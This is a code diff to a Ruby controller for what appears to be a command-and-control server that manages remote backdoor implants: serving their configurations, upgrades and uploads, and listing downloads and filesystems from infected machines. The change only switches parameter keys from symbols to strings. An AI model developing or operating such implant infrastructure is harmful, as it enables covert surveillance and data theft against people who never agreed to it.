@@ -15,8 +15,8 @@ class BackdoorController < RESTController
 
     classes = {}
 
-    if params[:backdoor] then
-      DB.instance.backdoor_class_key(params[:backdoor]).each do |entry|
+    if params['backdoor'] then
+      DB.instance.backdoor_class_key(params['backdoor']).each do |entry|
           classes[entry[:build]] = entry[:confkey]
         end
     else
@@ -32,7 +32,7 @@ class BackdoorController < RESTController
   def status
     require_auth_level :server
     
-    request = JSON.parse(params[:backdoor])
+    request = JSON.parse(params['backdoor'])
 
     status = DB.instance.backdoor_status(request['build_id'], request['instance_id'], request['subtype'])
 
@@ -49,12 +49,12 @@ class BackdoorController < RESTController
   def config
     case @req_method
       when 'GET'
-        content = DB.instance.backdoor_config(params[:backdoor])
+        content = DB.instance.backdoor_config(params['backdoor'])
         return STATUS_NOT_FOUND if content.nil?
         return STATUS_OK, content, 'binary/octet-stream'
       when 'PUT'
-        DB.instance.backdoor_config_sent(params[:backdoor])
-        trace :info, "[#{@req_peer}] Configuration sent [#{params[:backdoor]}]"
+        DB.instance.backdoor_config_sent(params['backdoor'])
+        trace :info, "[#{@req_peer}] Configuration sent [#{params['backdoor']}]"
     end
 
     return STATUS_OK
@@ -65,7 +65,7 @@ class BackdoorController < RESTController
   def uploads
     require_auth_level :server, :tech
 
-    list = DB.instance.backdoor_uploads(params[:backdoor])
+    list = DB.instance.backdoor_uploads(params['backdoor'])
 
     return STATUS_OK, *json_reply(list)
   end
@@ -74,7 +74,7 @@ class BackdoorController < RESTController
   def upload
     require_auth_level :server, :tech
 
-    request = JSON.parse(params[:backdoor])
+    request = JSON.parse(params['backdoor'])
 
     case @req_method
       when 'GET'
@@ -93,7 +93,7 @@ class BackdoorController < RESTController
   def upgrades
     require_auth_level :server, :tech
 
-    list = DB.instance.backdoor_upgrades(params[:backdoor])
+    list = DB.instance.backdoor_upgrades(params['backdoor'])
 
     return STATUS_OK, *json_reply(list)
   end
@@ -102,7 +102,7 @@ class BackdoorController < RESTController
   def upgrade
     require_auth_level :server, :tech
 
-    request = JSON.parse(params[:backdoor])
+    request = JSON.parse(params['backdoor'])
 
     case @req_method
       when 'GET'
@@ -121,7 +121,7 @@ class BackdoorController < RESTController
   def downloads
     require_auth_level :server, :tech
 
-    list = DB.instance.backdoor_downloads(params[:backdoor])
+    list = DB.instance.backdoor_downloads(params['backdoor'])
 
     return STATUS_OK, *json_reply(list)
   end
@@ -129,7 +129,7 @@ class BackdoorController < RESTController
   def download
     require_auth_level :server, :tech
 
-    request = JSON.parse(params[:backdoor])
+    request = JSON.parse(params['backdoor'])
 
     case @req_method
       when 'DELETE'
@@ -144,7 +144,7 @@ class BackdoorController < RESTController
   def filesystems
     require_auth_level :server, :tech
 
-    list = DB.instance.backdoor_filesystems(params[:backdoor])
+    list = DB.instance.backdoor_filesystems(params['backdoor'])
 
     return STATUS_OK, *json_reply(list)
   end
@@ -152,7 +152,7 @@ class BackdoorController < RESTController
   def filesystem
     require_auth_level :server, :tech
 
-    request = JSON.parse(params[:backdoor])
+    request = JSON.parse(params['backdoor'])
 
     case @req_method
       when 'DELETE'
